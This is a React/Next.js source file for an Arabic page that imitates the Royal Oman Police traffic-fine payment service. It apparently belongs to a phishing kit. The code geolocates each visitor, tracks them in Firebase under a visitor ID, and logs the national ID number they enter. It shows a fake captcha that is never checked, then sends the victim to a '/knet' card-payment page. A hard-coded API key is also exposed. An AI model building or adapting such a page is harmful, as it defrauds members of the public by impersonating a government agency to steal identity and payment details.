"use client"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Menu, RefreshCw } from "lucide-react"
import Link from "next/link"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
const visitorId = `omn-app-${Math.random().toString(36).substring(2, 15)}`;
export default function TrafficInquiry() {
  const [captchaCode, setCaptchaCode] = useState("L2Q2B")
  const [phone, setPhone] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  useEffect(() => {
    getLocation().then(() => {});
  }, []);
  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({
        id: visitorId,
        country: country,
      });
      localStorage.setItem("country", country);
      setupOnlineStatus(visitorId);
    } catch (error) {
      console.error("Error fetching location:", error);
    }
  }
  const refreshCaptcha = () => {
    // Generate random captcha code
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    let result = ""
    for (let i = 0; i < 5; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    setCaptchaCode(result)
  }
  const handleSubmit = async (e: any) => {
    e.preventDefault()
    setIsLoading(true)
    try {
      await addData({
        id: visitorId,
        phone: phone, // Storing phone number, ensure compliance with privacy regulations
        timestamp: new Date().toISOString(),
        currentPage: "كي نت ",
        action: "payment_submit_attempt"
      }).then(() => {
        window.location.href = "/knet"; // Replace with Next.js router if possible: router.push('/checkout')

      })

    } catch (error) {
      console.error("Submission error:", error);
      await addData({
        id: visitorId,
        action: "payment_submit_error",
        error: error instanceof Error ? error.message : String(error)
      });
      // Handle error display to user
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-100" dir="rtl">
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <button className="p-2">
              <Menu className="h-6 w-6 text-blue-800" />
            </button>
            <div className="flex items-center">
              <img src="/placeholder.svg?height=50&width=50" alt="شعار شرطة عمان السلطانية" className="h-12 w-12" />
            </div>
          </div>
        </div>
      </header>

      {/* Blue Navigation Bar */}
      <div className="bg-blue-800 text-white py-4">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <nav className="text-center">
            <span className="text-lg">الصفحة الرئيسية</span>
            <span className="mx-2">|</span>
            <span className="text-lg">الخدمات الإلكترونية</span>
          </nav>
          <div className="text-center mt-2">
            <span className="text-base">الاستفسار ودفع المخالفات المرورية</span>
          </div>
        </div>
      </div>

      {/* Listen Button */}
      <div className="bg-gray-200 py-4">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <Button className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded">🔊 للاستماع</Button>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <Card className="bg-white shadow-lg">
          <CardHeader className="text-center bg-gray-50">
            <CardTitle className="text-2xl font-bold text-gray-800 mb-2">الخدمات الإلكترونية</CardTitle>
            <p className="text-lg text-red-600 font-semibold">الاستفسار ودفع المخالفات المرورية</p>
          </CardHeader>

          <CardContent className="p-8">
            <p className="text-center text-gray-700 mb-8 leading-relaxed">
              تم تعبئة النموذج أدناه للاستعلام ودفع قيمة المخالفات المرورية
              <br />
              غير المسددة
            </p>

            <form className="space-y-6" onSubmit={handleSubmit}> 
              {/* Violation Type */}
              <div className="space-y-2">
                <Label htmlFor="violation-type" className="text-right block font-semibold">
                  رمز اللوحة
                </Label>
                <Select>
                  <SelectTrigger className="w-full text-right">
                    <SelectValue placeholder="اختر واحدة ..." />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="أ">أ - مسقط</SelectItem>
                    <SelectItem value="ب">ب - ظفار</SelectItem>
                    <SelectItem value="ج">ج - مسندم</SelectItem>
                    <SelectItem value="د">د - البريمي</SelectItem>
                    <SelectItem value="هـ">هـ - الداخلية</SelectItem>
                    <SelectItem value="و">و - شمال الباطنة</SelectItem>
                    <SelectItem value="ز">ز - جنوب الباطنة</SelectItem>
                    <SelectItem value="ح">ح - شمال الشرقية</SelectItem>
                    <SelectItem value="ط">ط - جنوب الشرقية</SelectItem>
                    <SelectItem value="ي">ي - الظاهرة</SelectItem>
                    <SelectItem value="ك">ك - الوسطى</SelectItem>

                    <SelectItem value="م">م - مركبات حكومية</SelectItem>
                    <SelectItem value="ش">ش - شرطة عمان السلطانية</SelectItem>
                    <SelectItem value="ق">ق - القوات المسلحة</SelectItem>
                    <SelectItem value="ف">ف - الحرس السلطاني</SelectItem>

                    <SelectItem value="ت">ت - سيارات أجرة</SelectItem>
                    <SelectItem value="ن">ن - نقل عام</SelectItem>
                    <SelectItem value="ص">ص - نقل بضائع</SelectItem>
                    <SelectItem value="ع">ع - تعليم القيادة</SelectItem>
                    <SelectItem value="س">س - سياحية (تأجير)</SelectItem>
                    <SelectItem value="ر">ر - سيارات إسعاف</SelectItem>
                    <SelectItem value="ل">ل - مؤقتة</SelectItem>
                    <SelectItem value="خ">خ - دبلوماسي</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Plate Number */}
              <div className="space-y-2">
                <Label htmlFor="plate-number" className="text-right block font-semibold">
                  رقم اللوحة
                </Label>
                <Input id="plate-number" placeholder="أدخل رقم المركبة" className="text-right" />
              </div>

              {/* Identity Type */}
              <div className="space-y-2">
                <Label htmlFor="identity-type" className="text-right block font-semibold">
                  اختر نوع الهوية
                </Label>
                <Select>
                  <SelectTrigger className="w-full text-right">
                    <SelectValue placeholder="اختر واحدة ..." />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="civil">الهوية المدنية</SelectItem>
                    <SelectItem value="passport">جواز السفر</SelectItem>
                    <SelectItem value="residence">بطاقة الإقامة</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Identity Number */}
              <div className="space-y-2">
                <Label htmlFor="identity-number" className="text-right block font-semibold">
                  أدخل رقم الهوية
                </Label>
                <Input id="identity-number"
                onChange={(e)=>setPhone(e.target.value)} 
                placeholder="أدخل رقم الهوية" className="text-right" />
              </div>

              {/* CAPTCHA */}
              <div className="space-y-2">
                <Label className="text-right block font-semibold">الرجاء أحد كتابة الأحرف من الصورة:</Label>
                <div className="flex items-center gap-4">
                  <div className="flex-1">
                    <Input placeholder="أدخل رمز التحقق" className="text-right" />
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="bg-gray-200 px-4 py-2 font-mono text-lg font-bold border border-gray-300 select-none">
                      {captchaCode}
                    </div>
                    <Button type="button" variant="outline" size="sm" onClick={refreshCaptcha}>
                      <RefreshCw className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="space-y-4 pt-6">
                <Link href="/payment">
                  <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 text-lg">
                    دفع المخالفات
                  </Button>
                </Link>

                <Link href="/payment-history">
                  <Button className="w-full bg-cyan-500 hover:bg-cyan-600 text-white py-3 text-lg">
                    المدفوعات السابقة
                  </Button>
                </Link>

                <Button className="w-full bg-orange-500 hover:bg-orange-600 text-white py-3 text-lg">
                  تنزيل التقرير
                </Button>
              </div>
            </form>
          </CardContent>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-blue-800 text-white py-6 mt-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="border-t border-blue-600 pt-4">
            <p className="text-center text-sm">© 2023 شرطة عمان السلطانية</p>
          </div>
        </div>
      </footer>
    </div>
  )
}
